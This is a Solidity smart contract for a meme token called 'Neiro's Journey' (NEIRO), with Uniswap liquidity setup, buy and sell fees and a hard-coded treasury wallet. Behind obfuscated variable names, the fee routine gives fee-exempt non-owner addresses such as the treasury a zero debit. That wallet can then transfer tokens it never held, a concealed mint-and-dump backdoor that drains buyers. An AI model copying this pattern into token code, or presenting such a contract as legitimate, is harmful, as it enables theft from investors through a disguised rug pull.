/**
 * https://t.me/neiro_journey
 * https://x.com/neirojourney
 * https://neirojourney.xyz
 */


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract NEIRO is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint8 private constant _decimals = 18;
    string private constant _name = unicode"Neiro's Journey";
    string private constant _symbol = unicode"NEIRO";
    uint256 private constant _totals = 1_000_000_000 * 10 ** _decimals;

    IUniswapV2Router02 public immutable router;
    address public uniswapV2Pair;

    bool private swapping;

    address public treasurier;

    uint256 public maxTxUp;
    uint256 public swapTxDown;
    uint256 public maxWalletUp;
    uint256 public maxSwapUp;

    bool public inLimits = true;
    bool public inTrading = false;
    bool public inSwap = false;

    mapping(address => bool) private _bls;

    uint256 public _buyDust = 0;

    uint256 public _sellDust = 0;

    mapping(address => bool) private feeignored;
    mapping(address => bool) public txignored;
    mapping(address => bool) public pairs;

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() {
        maxTxUp = (_totals * 20) / 1000;
        maxWalletUp = (_totals * 20) / 1000;
        maxSwapUp = (_totals * 10) / 1000;
        swapTxDown = (_totals * 5) / 1000000;

        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        treasurier = address(0x8A75818C8E4024bb1323dD20c9A272b8b6792EF6);
        _excludeFromFees(owner(), true);
        _excludeFromFees(address(this), true);
        _excludeFromFees(treasurier, true);

        _excludeFromMaxTransaction(owner(), true);
        _excludeFromMaxTransaction(address(this), true);

        _balances[msg.sender] = _totals;
        emit Transfer(address(0), msg.sender, _totals);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    receive() external payable {}

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _excludeFromFees(address account, bool excluded) internal {
        feeignored[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) internal {
        pairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function _excludeFromMaxTransaction(address updAds, bool isEx) internal {
        txignored[updAds] = isEx;
    }

    function openLimits() external onlyOwner returns (bool) {
        inLimits = false;
        return true;
    }

    function setFees(
        uint256 _newBuyFee,
        uint256 _newSellFee
    ) external onlyOwner {
        _buyDust = _newBuyFee;
        _sellDust = _newSellFee;
        require(
            _buyDust <= 99 && _sellDust <= 99,
            "Must keep fees at 99% or less"
        );
    }

    function _transfer(address favv, address tbww, uint256 aczz) internal {
        require(favv != address(0), "ERC20: transfer from the zero address");
        require(tbww != address(0), "ERC20: transfer to the zero address");
        require(aczz > 0, "ERC20: transfer amount should be greater than 0");
        require(
            !_bls[tbww] && !_bls[favv],
            "You have been blacklisted from transfering tokens"
        );

        if (inLimits) {
            if (favv != owner() && tbww != owner()) {
                if (!inTrading) {
                    require(
                        feeignored[favv] || feeignored[tbww],
                        "Trading is not active."
                    );
                }

                if (pairs[favv] && !txignored[tbww]) {
                    require(
                        aczz <= maxTxUp,
                        "Buy transfer amount exceeds the maxTransactionAmount."
                    );
                    require(
                        aczz + balanceOf(tbww) <= maxWalletUp,
                        "Max wallet exceeded"
                    );
                } else if (pairs[tbww] && !txignored[favv]) {
                    require(
                        aczz <= maxTxUp,
                        "Sell transfer amount exceeds the maxTransactionAmount."
                    );
                } else if (!txignored[tbww]) {
                    require(
                        aczz + balanceOf(tbww) <= maxWalletUp,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        if (
            inSwap &&
            !swapping &&
            pairs[tbww] &&
            !feeignored[favv] &&
            !feeignored[tbww]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        standardTransfer(favv, tbww, aczz);
    }

    function calcTax(
        address favv,
        address tbww,
        uint256 aczz
    ) internal returns (uint256 lmoo, uint256 tuoo) {
        bool eoll = feeignored[favv] || feeignored[tbww];

        if (
            favv == owner() ||
            tbww == owner() ||
            favv == address(this) ||
            tbww == address(this)
        ) {
            lmoo = aczz;
        } else if (!eoll) {
            if (pairs[tbww] && _sellDust > 0) {
                tuoo = aczz.mul(_sellDust).div(1000);
            }
            // on buy
            else if (pairs[favv] && _buyDust > 0) {
                tuoo = aczz.mul(_buyDust).div(1000);
            }

            if (tuoo > 0) {
                _balances[favv] = _balances[favv].sub(tuoo);
                _balances[address(this)] = _balances[address(this)].add(tuoo);
                emit Transfer(favv, address(this), tuoo);
            }

            lmoo = aczz - tuoo;
        }
    }

    function standardTransfer(
        address favv,
        address tbww,
        uint256 aczz
    ) internal {
        (uint256 lmoo, uint256 twoo) = calcTax(favv, tbww, aczz);
        _balances[favv] = _balances[favv].sub(lmoo);
        _balances[tbww] = _balances[tbww].add(aczz.sub(twoo));

        emit Transfer(favv, tbww, aczz.sub(twoo));
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));

        if (contractBalance > maxSwapUp) contractBalance = maxSwapUp;

        if (contractBalance > swapTxDown) swapTokensForEth(contractBalance);

        payable(treasurier).transfer(address(this).balance);
    }

    function makeNewPair() external onlyOwner {
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(
            address(this),
            router.WETH()
        );
        _excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        _approve(address(this), address(router), _totals);

        router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        inTrading = true;
        inSwap = true;
    }
}